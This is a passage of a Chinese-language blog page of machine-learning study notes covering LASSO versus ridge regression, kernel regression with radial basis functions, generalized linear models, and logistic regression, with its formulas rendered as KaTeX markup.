mathvariant="normal">∣</mi><mo>≤</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">\sum_{i=1}^{n} \vert θ_i \vert \le t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.929066em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.61508em;vertical-align:0em;"></span><span class="mord mathdefault">t</span></span></span></span></span></p><ul><li>与岭回归的不同在于，此约束条件使用了绝对值的一阶惩罚函数代替了平方和的二阶函数。虽然只是形式稍有不同，但是得到的结果却又很大差别。在LASSO中，当λ很小的时候，一些系数会随着变为0而岭回归却很难使得某个系数恰好缩减为0. 我们可以通过几何解释看到LASSO与岭回归之间的不同。</li></ul><p><img src="/images/pasted-34.png" alt="梯度图" /></p><ul><li>虽然惩罚函数只是做了细微的变化，但是相比岭回归可以直接通过矩阵运算得到回归系数相比，LASSO的计算变得相对复杂。</li></ul><h3 id="kernel-regression-and-rbfs"><a class="markdownIt-Anchor" href="#kernel-regression-and-rbfs"></a> Kernel Regression and RBFs</h3><ul><li><strong>径向基函数</strong></li><li>我们可以用核函数线性组合来表示线性回归模型：</li></ul><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Φ</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">[</mo><mi>κ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>μ</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>λ</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mi>κ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><msub><mi>μ</mi><mi>d</mi></msub><mo separator="true">,</mo><mi>λ</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Φ(x)=[κ(x,μ_1,λ),...,κ(x,μ_d,λ)]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Φ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathdefault">κ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">λ</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">κ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">λ</span><span class="mclose">)</span><span class="mclose">]</span></span></span></span>，e.g. 高斯核函数：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>κ</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>μ</mi><mo separator="true">,</mo><mi>λ</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mo>−</mo><msub><mi>μ</mi><mi>i</mi></msub><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow></msup></mrow><annotation encoding="application/x-tex">κ(x,μ,λ)=e^{-\frac{1}{2}||x-μ_i||^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">κ</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">μ</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">λ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.98692em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.98692em;"><span style="top:-3.363em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8443142857142858em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mord mtight">∣</span><span class="mord mtight">∣</span><span class="mord mathdefault mtight">x</span><span class="mbin mtight">−</span><span class="mord mtight"><span class="mord mathdefault mtight">μ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">∣</span><span class="mord mtight"><span class="mord mtight">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></p><ul><li>d的确定可以指定，这个可以使用x的个数，但是如果x个数太多，那么会导致很复杂。第二个方法可以通过Kmeans聚类。</li><li>超参数的确定，λ取0.1，μ取在x聚类后的均值。（还没验证…）</li></ul><h2 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h2><h3 id="广义线性回归"><a class="markdownIt-Anchor" href="#广义线性回归"></a> 广义线性回归</h3><ul><li>线性回归模型<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">y=w^Tx+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，如果将y表示为在指数尺度上的变化，则：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ln</mi><mo>⁡</mo><mi>y</mi><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">\ln y=w^Tx+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>称为对数线性回归。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>e</mi><mrow><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi></mrow></msup></mrow><annotation encoding="application/x-tex">y=e^{w^Tx+b}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.006365em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.006365em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9190928571428572em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">b</span></span></span></span></span></span></span></span></span></span></span></span>，实质上是在求输入空间到输出空间的非线性函数的映射（欧拉公式）。<br /><img src="/images/pasted-36.png" alt="upload successful" /></li><li>对更一般的单调可微函数g(x)，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><msup><mi>g</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">y=g^{-1}(w^Tx+b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span></span></span></span>这样的模型成为广义线性模型。g(x)称为联系函数（link function）</li></ul><h3 id="对数几率函数逻辑回归"><a class="markdownIt-Anchor" href="#对数几率函数逻辑回归"></a> 对数几率函数（逻辑回归）</h3><ul><li><p>之前讨论的是使用线性模型进行回归学习，如果要应用到分类中，思路就是利用广义线性模型，找一单调可微函数将分类任务的真实标记y与线性回归模型的预测值对应起来即可。</p></li><li><p>设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>z</mi><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">z=w^Tx+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，单位阶跃函数（unit-step function）表示为：<br /><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>0</mn><mo separator="true">,</mo><mi>z</mi><mo>&lt;</mo><mn>0</mn><mo separator="true">;</mo><mn>0.5</mn><mo separator="true">,</mo><mi>z</mi><mo>=</mo><mn>0</mn><mo separator="true">;</mo><mn>1</mn><mi>z</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">y=\begin{cases}0,z&lt;0;0.5,z=0;1z&gt;0\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.80002em;vertical-align:-0.65002em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9699999999999999em;"><span style="top:-2.9699999999999998em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4700000000000001em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p></li><li><p>可以表征二分类任务，z大于零为正例，小于零为负例，临界值可任意。但是单位阶跃不连续，固需利用类似的替代函数（surrogate function）：对数几率函数（logistic function）<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><mi>exp</mi><mo>⁡</mo><mrow><mo>−</mo><mi>z</mi></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">y=\frac{1}{1+\exp{-z}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.326216em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.04398em;">z</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></p></li><li><p>目前使用比较广泛的是对数几率函数logistic function，它是Sigmoid函数的一种。它的好处在于：</p><ol><li>单调可微</li><li>在0处变化陡峭，最接近阶跃函数，适合二分类。</li></ol></li><li><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>y</mi><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><mi>exp</mi><mo>⁡</mo><mrow><mo>−</mo><mo stretchy="false">(</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo></mrow></mrow></mfrac></mrow><annotation encoding="application/x-tex">y=\frac{1}{1+\exp{-(w^Tx+b)}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.3719729999999999em;vertical-align:-0.5268649999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.648135em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mop mtight">exp</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mtight"><span class="mord mtight">−</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7740928571428571em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">b</span><span class="mclose mtight">)</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5268649999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ln</mi><mo>⁡</mo><mfrac><mi>y</mi><mrow><mn>1</mn><mo>−</mo><mi>y</mi></mrow></mfrac><mo>=</mo><msup><mi>w</mi><mi>T</mi></msup><mi>x</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">\ln \frac{y}{1-y}=w^Tx+b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.228608em;vertical-align:-0.481108em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.924661em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mi>y</mi><mrow><mn>1</mn><mo>−</mo><mi>y</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{y}{1-y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.228608em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7475em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mbin mtight">−</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>含义就是比率，为正例的可能性与为反例的可能性比值。</p></li><li><p>从本质上讲，对数几率回归模型logistic regression就是在用线性回归模型的预测结果去逼近真实标记的对数几率。</p></li><li><p>确定模型之后，接下来自然要做的就是确定w和b。这里要使用到的方法是极大似然法（maximum likelihood method）。</p></li><li><p>给定数据集{<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x_i,y_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span 